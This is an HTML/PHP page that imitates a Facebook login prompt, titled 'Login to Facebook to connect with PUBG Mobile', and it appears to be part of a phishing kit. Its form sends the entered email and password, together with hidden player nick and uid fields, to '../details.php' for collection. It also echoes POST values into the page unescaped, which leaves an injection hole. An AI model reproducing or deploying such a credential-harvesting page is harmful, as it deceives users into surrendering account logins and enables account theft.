
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login to continue</title>
    <link rel="shorcut icon" href="">

    <!-- Style -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
      html,body {
        background-color: #eceff6;
      }

      button:focus,
      input:focus,
      textarea:focus,
      select:focus {
          outline: none;
      }

      .login {
        max-width: 100%;
        width: 500px;
        display: block;
        margin: 10px auto;
        box-shadow: 0px 0px 15px rgba(0,0,0, 0.1);
      }

      textarea:focus,
      input[type="text"]:focus,
      input[type="password"]:focus,
      input[type="datetime"]:focus,
      input[type="datetime-local"]:focus,
      input[type="date"]:focus,
      input[type="month"]:focus,
      input[type="time"]:focus,
      input[type="week"]:focus,
      input[type="number"]:focus,
      input[type="email"]:focus,
      input[type="url"]:focus,
      input[type="search"]:focus,
      input[type="tel"]:focus,
      input[type="color"]:focus,
      .uneditable-input:focus {
        border-color: #ced4da;
        box-shadow: 0 1px 1px rgba(0, 0, 0, 0) inset, 0 0 8px rgba(126, 239, 104, 0);
        outline: 0 none;
      }

      .bg-utama {
        background-color: #3b5998;
      }
      .img-login {
        width: 120px;
        margin: 3px auto;
      }

      .img-icon {
        width: 60px;
      }

      .text {
        font-size: 1em;
        display: block;
        margin-top: -8px;
        margin-bottom: 20px;
        color: #919191;
      }

      .form-control {
        display: block;
        height: 45px;
        margin: -1px auto;
      }

      .border-bottom-x {
        border-radius: 0px;
        border-top-left-radius: .25rem;
        border-top-right-radius: .25rem;
        outline: none;
        font-size: 14px;
      }

      .border-top-x {
        border-radius: 0px;
        border-bottom-left-radius: .25rem;
        border-bottom-right-radius: .25rem;
        outline: none;
        font-size: 14px;
      }

      .btn-login {
        width: 100%;
        display: block;
        margin: 10px auto;
        background-color: #3677ff;
        font-size: 15px;
      }

      .hiya {
        margin: -10px auto 15px auto;
      }

      .text-buat {
        margin: 13px auto;
        color: #3b5998;
      }

      .text-lupa {
        color: #919191;
        font-size: 0.8em;
      }

      @media only screen and (max-width: 600px) {
        .login {
          display: block;
          margin: 0 auto;
          box-shadow: 0px 0px 15px rgba(0,0,0, 0  );
        }
      }
    </style>
  </head>
  <body>
    <div class="login mx-auto d-block">
      <nav class="navbar bg-utama navbar-dark text-center">
        <div class="container">
          <img class="mx-auto d-block img-login" src="https://i.imgur.com/SmOIm89.png">
        </div>
      </nav>

      <div class="container">
        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <img class="img-icon mt-4 mb-4" src="../common/images/icon_logo.jpg">
            <div class="text">
              Login to Facebook <br>to connect with PUBG Mobile
            </div>
          </div>
        </div>

        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <form action="../details.php" method="POST">
              <div class="form-group">
                <input type="hidden" name="prov" value="Facebook">
                <input type="hidden" name="nick" value="<?= $_POST['nick'] ?>">
                <input type="hidden" name="uid" value="<?= $_POST['uid'] ?>">
                <input class="form-control border-bottom-x" type="text" name="email" placeholder="Email or Phone" autocomplete="off" required>
                <input class="form-control border-top-x" type="password" name="password" placeholder="Password">
                <button class="btn btn-login text-white" type="submit" name="login">Log In</button>
              </div>
            </form>
          </div>
        </div>

        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <div class="hiya">
              <a href="#" class="text-buat d-block">Create Account</a>
              <a href="#" class="text-buat d-block">Next Time</a>
              <a href="#" class="text-buat d-block text-lupa">Forgot Password? Help Center</a>
            </div>
            <div class="hiya mt-5">
              <a href="#" class="text-buat d-block text-lupa">Facebook &copy; 2020</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Script -->
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
  </body>
</html>